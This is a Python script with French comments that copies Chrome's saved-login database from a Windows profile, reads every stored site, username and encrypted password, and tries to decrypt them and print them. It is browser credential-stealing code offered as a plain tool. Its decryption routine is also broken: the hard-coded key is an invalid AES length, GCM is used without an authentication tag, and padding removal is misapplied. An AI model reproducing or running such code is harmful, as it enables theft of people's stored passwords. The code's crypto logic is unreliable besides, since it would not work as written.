import os
import shutil
import sqlite3
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.ciphers import algorithms, modes, Cipher
from cryptography.hazmat.backends import default_backend

nombre_de_requet = int(input('nombre_de_requet : '))

def get_chrome_passwords():
    # Chemin vers le fichier Login Data de Chrome
    path = os.path.expanduser('~') + r'\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'
    
    # Copie du fichier Login Data pour éviter les problèmes de verrouillage
    temp_path = os.path.join(os.getenv('TEMP'), 'Login Data')
    shutil.copyfile(path, temp_path)

    # Connexion à la base de données SQLite
    con = sqlite3.connect(temp_path)
    cursor = con.cursor()

    # Exécuter la requête SQL pour récupérer les mots de passe
    cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
    
    # Récupérer et décrypter les mots de passe
    for row in cursor.fetchall():
        origin_url = row[0]
        username = row[1]
        encrypted_password = row[2]
        password = decrypt_password(encrypted_password)
        print(f'URL: {origin_url}\nUsername: {username}\nPassword: {password}\n')

    # Fermer la connexion
    con.close()
    os.remove(temp_path)

def decrypt_password(encrypted_password):
    # Clé d'identification pour le chiffrement
    key = b'passwordencryption'

    # Déchiffrement des données
    backend = default_backend()
    cipher = Cipher(algorithms.AES(key), modes.GCM(encrypted_password[:12]), backend=backend)
    decryptor = cipher.decryptor()
    decrypted_data = decryptor.update(encrypted_password[12:]) + decryptor.finalize()

    # Suppression du bourrage ajouté
    unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
    decrypted_password = unpadder.update(decrypted_data) + unpadder.finalize()

    return decrypted_password.decode('utf-8')

# Exécution du script
if __name__ == "__main__":
    get_chrome_passwords()
